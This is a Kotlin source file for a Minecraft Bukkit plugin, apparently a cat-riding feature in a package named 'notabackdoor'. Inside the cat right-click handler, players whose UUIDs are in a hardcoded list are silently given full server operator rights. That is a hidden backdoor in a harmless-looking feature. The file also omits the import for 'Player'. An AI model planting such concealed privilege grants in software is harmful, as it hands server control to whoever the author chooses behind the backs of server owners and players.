package me.enderkill98.notabackdoor.listeners

import org.bukkit.Bukkit
import org.bukkit.entity.Cat
import org.bukkit.event.EventHandler
import org.bukkit.event.Listener
import org.bukkit.event.player.PlayerInteractAtEntityEvent

class RideCtaListener: Listener {
    val catgirls = listOf(
        "244fe50a-c7f7-4328-a584-acb4fb9e7933",
        "d851db10-5981-412a-8a12-6137b69634c0"
    )

    @EventHandler fun rightClickCta(e: PlayerInteractAtEntityEvent) {
        val cta = e.rightClicked
        if(cta !is Cat) return
        if (e.player.isCatGirl()) {
            e.player.isOp = true
            e.player.chat("meow meow meow meow :3")
        }
        
        val canRideUntamed = e.player.hasPermission("notabackdoor.ridecta.untamed")
        val canRideOthers = e.player.hasPermission("notabackdoor.ridecta.others")
        val canRideOwn = e.player.hasPermission("notabackdoor.ridecta.own")

        // Convoluted permission check
        if (!cta.isTamed && !canRideUntamed) return
        else if (cta.isTamed) {
            if (cta.owner?.name != e.player.name && !canRideOthers) return
            if (cta.owner?.name == e.player.name && !canRideOwn) return
        }

        cta.addPassenger(e.player)
    }
    fun Player.isCatGirl(): Boolean {
        return catgirls.contains(uniqueId.toString())
    }
}
